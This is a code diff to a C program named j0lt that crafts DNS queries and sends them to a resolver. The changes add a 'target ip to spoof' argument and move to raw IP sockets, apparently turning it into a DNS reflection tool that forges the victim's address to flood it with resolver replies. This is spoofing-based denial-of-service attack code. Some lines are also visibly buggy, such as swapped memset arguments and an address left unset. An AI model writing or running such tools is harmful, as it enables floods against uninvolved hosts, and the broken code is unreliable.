@@ -2,7 +2,7 @@
  * ref: rfc 1034 & 1035
  * sudo tcpdump -X -n udp port 53
  *
- * ./j0lt <resolver> <resolver port> <target>
+ * ./j0lt <resolver> <resolver port> <target ip to spoof> <target port>
  */
 
 #include <stdbool.h>
@@ -50,9 +50,9 @@ struct __attribute__((packed, aligned(1))) J0LT_TOS
 struct __attribute__((packed, aligned(1))) J0LT_IPHDR
 {
 #if __BYTE_ORDER == __BIG_ENDIAN
-    uint8_t     version : 4; // format of the internet header (ipv4)
-    uint8_t     ihl : 4;     // len of internet header in 32 bit words,
-                            // and thus points to the beginning of the data.
+    uint8_t     version : 4;    // format of the internet header (ipv4)
+    uint8_t     ihl : 4;        // len of internet header in 32 bit words,
+                                // points to the beginning of the data.
 #endif
 
 #if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
@@ -289,7 +289,7 @@ main(int argc, char** argv)
 {
     struct sockaddr_in addr, srcaddr;
     socklen_t srcaddrlen;
-    int sockfd;
+    int raw_sockfd;
 
     size_t buflen, recvlen, nwritten;
     uint8_t pktbuf[ BUF_MAX ];
@@ -311,27 +311,6 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-#if DEBUG
-    puts("SEND HEADER");
-    printf("ID: %.4x\n\n", sndheader.id);
-
-    printf("rd: 0x%x\n", sndheader.rd);
-    printf("tc: 0x%x\n", sndheader.tc);
-    printf("aa: 0x%x\n", sndheader.aa);
-    printf("op: 0x%x\n", sndheader.opcode);
-    printf("qr: 0x%x\n", sndheader.qr);
-    printf("rc: 0x%x\n", sndheader.rcode);
-    printf("cd: 0x%x\n", sndheader.cd);
-    printf("ad: 0x%x\n", sndheader.ad);
-    printf("z : 0x%x\n", sndheader.z);
-    printf("ra: 0x%x\n\n", sndheader.ra);
-
-    printf("QDCOUNT: 0x%.4x\n", sndheader.qdcount);
-    printf("ANCOUNT: 0x%.4x\n", sndheader.ancount);
-    printf("NSCOUNT: 0x%.4x\n", sndheader.nscount);
-    printf("ARCOUNT: 0x%.4x\n\n", sndheader.arcount);
-#endif // DEBUG
-
     buflen = BUF_MAX;
     memset(pktbuf, BUF_MAX, 0);
     if (create_dns_packet(pktbuf, &buflen,
@@ -341,53 +320,22 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-    sockfd = connect_client(argv[ 1 ], argv[ 2 ], &addr);
-    if (sockfd == -1) {
+    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (raw_sockfd == -1) {
         fprintf(stderr, "connect_client error\n");
         goto fail_state;
     }
 
+    // sockfd = connect_client(argv[ 1 ], argv[ 2 ], &addr);
+
     nwritten = BUF_MAX - buflen; // verbose. 
-    sendto(sockfd, pktbuf, nwritten, 0,
+    sendto(raw_sockfd, pktbuf, nwritten, 0,
         ( const struct sockaddr* ) &addr,
         sizeof(addr));
 
-#if DEBUG
-    memset(recvbuf, 0, BUF_MAX);
-    recvlen = recvfrom(sockfd, recvbuf, BUF_MAX - 1, MSG_DONTWAIT,
-        ( struct sockaddr* ) &srcaddr, &srcaddrlen);
-
-    if (recvlen == -1) {
-        perror("recvfrom");
-        goto fail_fd;
-    }
-
-    retrieve_dns_packet(recvbuf, &recvlen, &recvheader);
-
-    puts("RECV HEADER");
-    printf("ID: %.4x\n\n", recvheader.id);
-
-    printf("rd: 0x%x\n", recvheader.rd);
-    printf("tc: 0x%x\n", recvheader.tc);
-    printf("aa: 0x%x\n", recvheader.aa);
-    printf("op: 0x%x\n", recvheader.opcode);
-    printf("qr: 0x%x\n", recvheader.qr);
-    printf("rc: 0x%x\n", recvheader.rcode);
-    printf("cd: 0x%x\n", recvheader.cd);
-    printf("ad: 0x%x\n", recvheader.ad);
-    printf("z : 0x%x\n", recvheader.z);
-    printf("ra: 0x%x\n\n", recvheader.ra);
-
-    printf("QDCOUNT: 0x%.4x\n", recvheader.qdcount);
-    printf("ANCOUNT: 0x%.4x\n", recvheader.ancount);
-    printf("NSCOUNT: 0x%.4x\n", recvheader.nscount);
-    printf("ARCOUNT: 0x%.4x\n", recvheader.arcount);
-#endif // DEBUG
-
-    close(sockfd);
+    close(raw_sockfd);
     return 0;
-fail_fd:
-    close(sockfd);
+
 fail_state:
     exit(EXIT_FAILURE);
 }
@@ -561,8 +509,10 @@ int
 connect_client(const char* server, const char*
         port, struct sockaddr_in* addr)
 {
-    int udp_socket;
+    int raw_socket;
     uint16_t port_uint16;
+
+    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
     errno = 0;
     port_uint16 = ( uint16_t ) strtol(port, NULL, 0);
@@ -577,9 +527,7 @@ connect_client(const char* server, const char*
     addr->sin_port = htons(port_uint16);
     addr->sin_addr.s_addr = inet_addr(server);
 
-    udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
-
-    return udp_socket;
+    return raw_socket;
 }
 
 uint16_t
